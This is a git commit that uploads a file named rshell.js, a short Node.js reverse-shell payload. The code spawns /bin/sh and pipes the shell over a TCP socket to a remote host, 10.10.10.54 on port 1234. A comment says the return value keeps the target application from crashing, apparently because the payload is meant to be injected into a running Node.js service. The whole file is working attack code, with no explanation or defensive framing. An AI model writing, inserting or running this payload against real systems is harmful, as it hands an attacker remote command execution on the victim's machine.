efc97ed0af6641f00bdaa1a500ffee422a10f1ae
yongleejiaa <88046602+yongleejiaa@users.noreply.github.com>
2021-11-15 14:49:26 +0800

    Add files via upload

---
+++ rshell.js
@@ -0,0 +1,13 @@
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1234, "10.10.10.54", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
